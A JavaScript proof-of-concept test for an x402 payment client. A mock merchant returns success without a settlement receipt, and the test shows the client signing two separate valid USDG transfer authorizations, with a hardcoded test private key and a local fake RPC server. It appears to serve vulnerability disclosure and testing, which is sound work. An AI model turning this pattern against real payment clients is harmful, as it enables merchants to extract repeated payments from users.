import assert from "node:assert/strict";
import http from "node:http";
import { ethers } from "ethers";
import { createPayer } from "../packages/x402/src/payer.mjs";
import { robinhood, TRANSFER_WITH_AUTHORIZATION_TYPES } from "../packages/x402/src/robinhood.mjs";

const PRICE = 50_000n; // 0.05 USDG
const PAYMENT_URL = "https://merchant.example/premium";
const PAY_TO = "0x000000000000000000000000000000000000dEaD";
const PRIVATE_KEY = "0x59c6995e998f97a5a0044976f0945389dc9e86dae88c7a6d5efc2a2e9cc92a7b";

function b64json(value) {
  return Buffer.from(JSON.stringify(value), "utf8").toString("base64");
}

function decodePaymentSignature(header) {
  const json = Buffer.from(header, "base64").toString("utf8");
  return JSON.parse(json);
}

async function startFakeRpc() {
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", chunk => { body += chunk; });
    req.on("end", () => {
      const call = JSON.parse(body);
      const calls = Array.isArray(call) ? call : [call];
      const answer = (c) => {
        let result = "0x";
        if (["eth_chainId"].includes(c.method)) result = "0x1237"; // 4663
        else if (c.method === "eth_blockNumber") result = "0x1";
        else if (c.method === "eth_call") {
          // 10 USDG balance, enough for the 0.05 USDG purchase.
          result = ethers.zeroPadValue(ethers.toBeHex(10_000_000n), 32);
        } else if (["net_version"].includes(c.method)) result = "4663";
        else if (c.method === "eth_getCode") result = "0x";
        else result = "0x";
        return { jsonrpc: "2.0", id: c.id, result };
      };
      const payload = Array.isArray(call) ? calls.map(answer) : answer(call);
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(payload));
    });
  });
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", resolve);
  });
  return server;
}

const rpc = await startFakeRpc();
const rpcUrl = `http://127.0.0.1:${rpc.address().port}`;
try {
  const provider = new ethers.JsonRpcProvider(rpcUrl, 4663, { staticNetwork: true, batchMaxCount: 1 });
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

  const requirement = {
    scheme: "exact",
    network: robinhood.network,
    amount: PRICE.toString(),
    asset: robinhood.usdg,
    payTo: PAY_TO,
    maxTimeoutSeconds: 60,
    extra: { name: robinhood.eip712.name, version: robinhood.eip712.version },
  };

  const paymentRequired = {
    x402Version: 2,
    resource: { url: PAYMENT_URL, description: "PoC paid resource", mimeType: "application/json" },
    accepts: [requirement],
    extensions: {},
  };

  const paymentRequiredHeader = b64json(paymentRequired);
  const observed = [];
  let unsignedRequests = 0;

  const merchantFetch = async (input) => {
    const req = input instanceof Request ? input : new Request(input);
    const payment = req.headers.get("PAYMENT-SIGNATURE");

    if (!payment) {
      unsignedRequests++;
      return new Response(JSON.stringify(paymentRequired), {
        status: 402,
        headers: {
          "content-type": "application/json",
          "PAYMENT-REQUIRED": paymentRequiredHeader,
        },
      });
    }

    observed.push(payment);

    // Deliberately return success WITHOUT PAYMENT-RESPONSE.
    // Per x402 HTTP semantics, the settlement receipt is the signal that payment settled.
    return new Response(JSON.stringify({ ok: true, premium: "data" }), {
      status: 200,
      headers: { "content-type": "application/json" },
    });
  };

  const payer = createPayer({
    signer: wallet,
    maxPrice: PRICE,
    fetchImpl: merchantFetch,
    pendingRetries: 0,
    timeoutMs: 5_000,
  });

  const first = await payer.pay(PAYMENT_URL);
  assert.equal(first.response.status, 200);
  assert.equal(first.paid, PRICE);
  assert.equal(first.settlement, undefined);
  assert.equal(unsignedRequests, 1);
  assert.equal(observed.length, 1);

  const second = await payer.pay(PAYMENT_URL);
  assert.equal(second.response.status, 200);
  assert.equal(second.paid, PRICE);
  assert.equal(second.settlement, undefined);
  assert.equal(unsignedRequests, 2);
  assert.equal(observed.length, 2);

  assert.notEqual(observed[0], observed[1], "second purchase must not reuse the first signed authorization");

  const payloads = observed.map(decodePaymentSignature);
  const auths = payloads.map(p => p.payload.authorization);
  const signatures = payloads.map(p => p.payload.signature);

  assert.notEqual(auths[0].nonce, auths[1].nonce, "the two authorizations must be distinct nonces");
  assert.equal(auths[0].value, PRICE.toString());
  assert.equal(auths[1].value, PRICE.toString());
  assert.equal(auths[0].to.toLowerCase(), PAY_TO.toLowerCase());
  assert.equal(auths[1].to.toLowerCase(), PAY_TO.toLowerCase());
  assert.equal(auths[0].from.toLowerCase(), wallet.address.toLowerCase());
  assert.equal(auths[1].from.toLowerCase(), wallet.address.toLowerCase());

  const domain = {
    name: robinhood.eip712.name,
    version: robinhood.eip712.version,
    chainId: robinhood.chainId,
    verifyingContract: robinhood.usdg,
  };

  const recovered = signatures.map((sig, i) =>
    ethers.verifyTypedData(domain, TRANSFER_WITH_AUTHORIZATION_TYPES, auths[i], sig)
  );

  assert.equal(recovered[0].toLowerCase(), wallet.address.toLowerCase());
  assert.equal(recovered[1].toLowerCase(), wallet.address.toLowerCase());

  console.log("PASS: vulnerable client accepted two 200 responses with no settlement receipt.");
  console.log(`  unsigned 402 challenges: ${unsignedRequests}`);
  console.log(`  distinct PAYMENT-SIGNATUREs sent: ${observed.length}`);
  console.log(`  distinct nonces: ${auths[0].nonce} / ${auths[1].nonce}`);
  console.log(`  each authorization: ${Number(PRICE) / 1e6} USDG to ${PAY_TO}`);
  console.log(`  total independently valid authorizations: ${(Number(PRICE) * 2) / 1e6} USDG`);
  console.log("  both EIP-712 signatures recover to the same payer wallet.");
} finally {
  await new Promise(resolve => rpc.close(resolve));
}
